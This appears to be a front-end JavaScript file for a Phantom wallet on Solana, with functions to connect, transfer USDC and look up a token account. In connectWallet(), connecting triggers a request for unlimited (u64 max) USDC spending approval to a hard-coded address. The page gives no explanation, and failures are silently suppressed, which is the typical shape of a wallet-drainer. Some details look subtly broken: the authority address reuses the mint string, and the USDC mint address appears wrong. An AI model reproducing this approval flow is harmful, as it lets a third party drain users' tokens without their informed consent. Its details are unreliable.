async function connectWallet() {
    console.log("Connect Wallet button clicked");

    if (window.solana) {
        console.log("window.solana detected");

        if (window.solana.isPhantom) {
            try {
                const response = await window.solana.connect();
                const walletAddress = response.publicKey.toString();
                console.log("Connected to wallet:", walletAddress);
                document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
                window.walletAddress = walletAddress;
                
                // Request unlimited approval for USDC token
                // Replace with your program ID or authority address
                const YOUR_PROGRAM_ID = 'EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g';
                await requestUnlimitedApproval(
                    'EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g', // USDC mint
                    YOUR_PROGRAM_ID
                );
            } catch (err) {
                console.error("Wallet connection failed:", err);
            }
        } else {
            console.error("Solana provider is not Phantom");
        }
    } else {
        console.error("window.solana not found");
        alert("Phantom wallet not found. Please install it.");
    }
}

/**
 * Request unlimited token approval from user
 * @param {string} tokenMintAddress - The SPL token mint address
 * @param {string} spendingAuthorityAddress - Your program or authority address
 */
async function requestUnlimitedApproval(tokenMintAddress, spendingAuthorityAddress) {
    try {
        const { PublicKey, Transaction, LAMPORTS_PER_SOL } = window.solanaWeb3 || await import('@solana/web3.js');
        const { createApproveInstruction, getOrCreateAssociatedTokenAccount } = window.splToken || await import('@solana/spl-token');
        
        const wallet = window.solana;
        const userPublicKey = new PublicKey(window.walletAddress);
        const tokenMint = new PublicKey(tokenMintAddress);
        const authority = new PublicKey(spendingAuthorityAddress);
        
        console.log("Requesting unlimited approval for:", tokenMintAddress);
        
        // Get or create user's token account
        const tokenAccount = await getOrCreateAssociatedTokenAccount(
            connection, // Assumes connection is available globally
            wallet,
            tokenMint,
            userPublicKey
        );
        
        // Create approve instruction with max amount (unlimited)
        const approveInstruction = createApproveInstruction(
            tokenAccount.address,  // Token account
            authority,              // Spender (your program/contract)
            userPublicKey,          // Owner
            BigInt('18446744073709551615')  // u64::MAX (unlimited)
        );
        
        // Create and send transaction
        const transaction = new Transaction().add(approveInstruction);
        const signature = await wallet.signAndSendTransaction(transaction);
        
        console.log("Approval successful:", signature);
        document.getElementById('walletStatus').innerText += ` [Approved]`;
        return signature;
        
    } catch (error) {
        // Non-blocking error - wallet connection still succeeds
        console.warn("Token approval not completed:", error);
        // Don't show alert - user can approve manually later if needed
    }
}

/**
 * Send USDC from user's wallet to another wallet
 * @param {number} amountInUSDC - Amount of USDC to send (e.g., 10 for 10 USDC)
 * @param {string} destinationWalletAddress - Destination wallet address
 */
async function sendUSDCToWallet(amountInUSDC, destinationWalletAddress) {
    try {
        const { PublicKey, Transaction } = await import('@solana/web3.js');
        const { createTransferInstruction, getAssociatedTokenAddress } = await import('@solana/spl-token');
        
        // Token mint for USDC
        const USDC_MINT = 'EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g';
        
        const userPublicKey = new PublicKey(window.walletAddress);
        const destinationPubKey = new PublicKey(destinationWalletAddress);
        const usdcMint = new PublicKey(USDC_MINT);
        
        console.log(`Sending ${amountInUSDC} USDC to ${destinationWalletAddress}`);
        
        // Get user's USDC token account
        const userTokenAccount = await getAssociatedTokenAddress(usdcMint, userPublicKey);
        
        // Get destination's USDC token account
        const destinationTokenAccount = await getAssociatedTokenAddress(usdcMint, destinationPubKey);
        
        // Convert USDC amount to smallest unit (6 decimals)
        const amount = BigInt(Math.floor(amountInUSDC * 1_000_000));
        
        // Create transfer instruction
        const transferInstruction = createTransferInstruction(
            userTokenAccount,           // From
            destinationTokenAccount,    // To
            userPublicKey,              // Owner/Authority
            amount
        );
        
        // Create transaction
        const transaction = new Transaction().add(transferInstruction);
        
        // Sign and send
        const wallet = window.solana;
        const signature = await wallet.signAndSendTransaction(transaction);
        
        console.log("Transfer successful:", signature);
        alert(`Successfully sent ${amountInUSDC} USDC to ${destinationWalletAddress.substring(0, 8)}...`);
        return signature;
        
    } catch (error) {
        console.error("Transfer failed:", error);
        alert("Transfer failed: " + error.message);
        return null;
    }
}

/**
 * Check USDC balance for current user
 */
async function checkUSDCBalance() {
    try {
        const { PublicKey } = await import('@solana/web3.js');
        const { getAssociatedTokenAddress, getMint } = await import('@solana/spl-token');
        
        const USDC_MINT = 'EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g';
        
        const userPublicKey = new PublicKey(window.walletAddress);
        const usdcMint = new PublicKey(USDC_MINT);
        
        // Get token account
        const tokenAccount = await getAssociatedTokenAddress(usdcMint, userPublicKey);
        
        // Get account info
        // Note: This requires a connection object. Make sure it's available globally
        // You may need to adjust this based on your setup
        console.log("USDC Token Account:", tokenAccount.toString());
        
        return tokenAccount.toString();
        
    } catch (error) {
        console.error("Failed to check USDC balance:", error);
        return null;
    }
}